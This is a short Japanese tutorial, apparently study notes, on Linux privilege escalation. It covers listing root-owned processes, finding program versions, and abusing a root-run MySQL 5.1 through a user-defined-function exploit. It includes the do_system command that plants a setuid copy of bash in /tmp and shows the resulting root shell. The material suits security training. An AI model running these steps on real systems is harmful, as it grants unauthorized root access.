# ルートで動作しているサービス
以下のコマンドを実行すると、rootとして動作しているすべてのプロセスが表示されます。   
```
$ ps aux | grep "^root"
```
どのような結果であっても、実行されているプログラムのバージョン番号を特定するようにしてください。   
# プログラムバージョンの列挙
コマンドラインオプション --version/-v を付けてプログラムを実行すると、多くの場合、バージョン番号が表示されます。    
```
$ <program> --version
$ <program> -v
```
Debianのようなディストリビューションでは、dpkgはインストールされたプログラムとそのバージョンを表示することができます。   
```
$ dpkg -l | grep <program>
```
rpmを使用するシステムでは、以下のように実現します   
```
$ rpm –qa | grep <program>
```
# Privilege Escalation
1. rootとして動作しているプロセスを列挙します。   
```
$ ps aux | grep "^root”
...
root 6933 0.0 4.9 165472 24376 pts/0 Sl 02:13 0:02 /usr
/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root ...
```
mysqldプロセスはrootで実行されていることに注意してください。   
2. mysqldのバージョンを列挙する。  
```
$ mysqld --version
mysqld Ver 5.1.73-1+deb6u1 for debian-linux-gnu on x86_64 ((Debian))
```
3. MySQLには、共有オブジェクトを介して実行されるユーザー定義関数（UDF）をインストールする機能があります。   
4. このエクスプロイトの説明に従って、システムコマンドを実行するUDFをコンパイルしてインストールします。   
https://www.exploit-db.com/exploits/1518   
注：一部のコマンドは若干の修正を必要とする場合があります。
5. UDFがインストールされたら、MySQLシェルで以下のコマンドを実行します。
```
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```
6. 通常のシェルに戻り、/tmp/rootbashを実行してrootシェルにします。
```
$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```
